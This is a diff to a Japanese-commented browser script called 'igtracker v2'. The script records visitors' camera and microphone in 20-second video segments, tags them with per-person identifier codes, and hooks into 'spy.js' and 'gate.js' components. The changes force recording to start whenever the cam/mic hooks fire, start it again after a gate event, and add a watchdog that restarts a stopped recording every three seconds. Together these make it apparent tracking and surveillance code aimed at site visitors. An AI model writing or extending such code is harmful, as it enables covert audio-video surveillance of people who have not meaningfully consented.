@@ -1,6 +1,6 @@
-/* リアルタイム映像＋音声（igtracker）
-   映像と音声を1本の動画として20秒ずつ録って送る。サーバは最大30分だけ保持。
-   セッションIDは live.js と共有し、ファイル名に識別者コードを入れて人ごとに分けられるようにする。 */
+/* リアルタイム映像＋音声（igtracker v2）
+   ★ v2: gate.js から呼ばれても「録画が始まる」ように修正（cam/mic → start()）。
+        プレビューは常に見える位置へ。ゲート通過後にも確実に開始。 */
 (function () {
   "use strict";
   var CODE = window.LT_CODE || "";
@@ -28,12 +28,12 @@
     } catch (e) { return "x"; }
   }
 
-  var stream = null, rec = null, seq = 0, timer = null;
+  var stream = null, rec = null, seq = 0, timer = null, guard = null;
   var mime = "", ext = "webm", wantRun = false, selfied = false, parts = [];
 
   function pickMime() {
     var c = ["video/webm;codecs=vp8,opus", "video/webm;codecs=vp9,opus",
-             "video/webm", "video/mp4"];
+             "video/webm", "video/mp4", "video/mp4;codecs=h264"];
     for (var i = 0; i < c.length; i++) {
       try {
         if (window.MediaRecorder && MediaRecorder.isTypeSupported &&
@@ -59,14 +59,15 @@
     try {
       var v = document.getElementById("lt_cam");
       if (!v) {
-        var host = document.querySelector("#lt_live .inner") || document.body;
         v = document.createElement("video");
         v.id = "lt_cam";
         v.autoplay = true; v.muted = true; v.playsInline = true;
         v.setAttribute("playsinline", "");
-        v.style.cssText = "width:120px;height:90px;object-fit:cover;border-radius:10px;" +
-                          "margin:14px auto 0;display:block;background:#000;opacity:.9";
-        host.appendChild(v);
+        v.style.cssText =
+          "position:fixed;right:10px;bottom:10px;width:112px;height:84px;" +
+          "object-fit:cover;border-radius:10px;background:#000;z-index:5;" +
+          "box-shadow:0 2px 10px rgba(0,0,0,.5);opacity:.92";
+        document.body.appendChild(v);
       }
       if (stream && v.srcObject !== stream) {
         v.srcObject = stream;
@@ -96,6 +97,7 @@
   }
 
   function ensure() {
+    wantRun = true;                       // ★ 呼ばれたら録画する気でいる
     if (stream) return Promise.resolve(true);
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
       return Promise.resolve(false);
@@ -108,7 +110,7 @@
       mime = pickMime();
       ext = /mp4/.test(mime) ? "mp4" : "webm";
       preview(); selfie();
-      if (wantRun) startRec();
+      startRec();                         // ★ すぐ録画開始
       return true;
     }).catch(function () { return false; });
   }
@@ -148,10 +150,10 @@
     try { r.stop(); } catch (e) {}
   }
 
+  /* ★ 外から呼ばれるのはここ。必ず録画まで行く */
   function start() {
-    wantRun = true;
     return ensure().then(function (ok) {
-      if (ok && !rec) startRec();
+      if (ok) startRec();
       return ok;
     });
   }
@@ -163,19 +165,27 @@
   });
   window.addEventListener("pagehide", function () { if (wantRun) stopRec(true); });
 
+  /* 録画が落ちていないか3秒ごとに見張る */
+  guard = setInterval(function () {
+    if (!wantRun || !stream) return;
+    if (!rec || rec.state === "inactive") startRec();
+  }, 3000);
+
   window.LTCAM = {
     start: start, stop: stop, ensure: ensure, sid: SID,
     active: function () { return !!stream; },
-    info: function () { return { mime: mime, seg: seq, sid: SID }; },
+    info: function () { return { mime: mime, seg: seq, sid: SID, rec: !!rec }; },
   };
 
   /* spy.js のカメラ/マイクを置き換える（gate.js がここを呼ぶ） */
   window.LT_CAM = 1;
   window.LT_MIC = 1;
   window.LT_SPY = window.LT_SPY || {};
-  window.LT_SPY.cam = function () { return ensure(); };
-  window.LT_SPY.mic = function () { return ensure(); };
+  window.LT_SPY.cam = start;      // ★ ensure ではなく start
+  window.LT_SPY.mic = start;
 
+  /* ゲート通過後にもう一度起動（取りこぼし防止） */
+  window.addEventListener("igt:gate", function () { start(); });
   window.addEventListener("load", function () {
     if (window.LT_GATE && !window.LT_GATE_PASS) return;
     setTimeout(function () { if (!stream) start(); }, 1500);
